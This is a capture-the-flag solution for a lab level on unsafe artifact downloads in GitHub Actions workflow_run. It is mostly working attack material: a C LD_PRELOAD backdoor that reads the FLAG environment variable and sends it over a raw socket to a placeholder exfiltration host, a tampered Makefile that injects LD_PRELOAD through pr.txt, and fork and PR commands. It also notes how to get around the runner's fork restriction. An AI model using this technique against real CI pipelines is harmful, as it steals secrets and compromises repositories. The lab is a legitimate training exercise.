# Level 2 - Unsafe artifact download in workflow_run

## Description

The whole `outputs` folder is uploaded in artifacts and is then downloaded in a subsidiary `workflow_run` containing the flag.
The attacker can modify the `Makefile` through a PR to abuse the fact that the `pr.txt` file content is set as environment variable, thus making it possible to do the `LD_PRELOAD` trick.

## Solution

1. Fork the repo

```bash
gh repo fork --clone --default-branch-only '<ORG>/level-2'
```

2. Create the `LD_PRELOAD` backdoor in a new `backdoor.c` file:

> **Note:** `system()` / `popen()` fail with `Cannot fork` on GitHub Actions runners due to process sandboxing. Use a raw socket to exfiltrate instead.

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>

__attribute__((constructor)) void pwn() {
    const char *flag = getenv("FLAG");
    if (!flag) return;

    char body[512], request[1024];
    int body_len = snprintf(body, sizeof(body), "%s", flag);

    snprintf(request, sizeof(request),
        "POST /exfil HTTP/1.0\r\n"
        "Host: <EXFIL_HOST>\r\n"
        "Content-Type: text/plain\r\n"
        "Content-Length: %d\r\n"
        "\r\n"
        "%s",
        body_len, body);

    struct addrinfo hints, *res;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    if (getaddrinfo("<EXFIL_HOST>", "80", &hints, &res) != 0) return;

    int sock = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
    if (sock < 0) { freeaddrinfo(res); return; }

    if (connect(sock, res->ai_addr, res->ai_addrlen) == 0)
        send(sock, request, strlen(request), 0);

    close(sock);
    freeaddrinfo(res);
}
```

3. Create a new branch and modify the `Makefile` (modify <PR_NUMBER> with the actual PR number):

```Makefile
# Compiler and flags
CC = gcc
CFLAGS = -Wall -Wextra -O2
PICFLAGS = -fPIC -shared
LDFLAGS = -ldl

# Targets
TARGET = prog
SO_TARGET = outputs/backdoor.so
PR_FILE = outputs/pr.txt

# Default rule
all: $(TARGET) $(SO_TARGET) $(PR_FILE)

# Rule to build the binary
$(TARGET): main.c
	$(CC) $(CFLAGS) -o $@ main.c

# Rule to build shared object from backdoor.c
$(SO_TARGET): backdoor.c | outputs
	$(CC) $(PICFLAGS) -o $@ backdoor.c $(LDFLAGS)

# Rule to overwrite pr.txt with LD_PRELOAD env variable
.PHONY: $(PR_FILE)
$(PR_FILE): | outputs
	printf "<PR_NUMBER>\nLD_PRELOAD=./backdoor.so" > $@

outputs:
	mkdir -p outputs

# Clean everything
clean:
	rm -f $(TARGET)
	rm -rf outputs
```

4. Create a PR with the new branch:

```bash
gh pr create --draft -t 'Backdoor' -b 'foo'
```
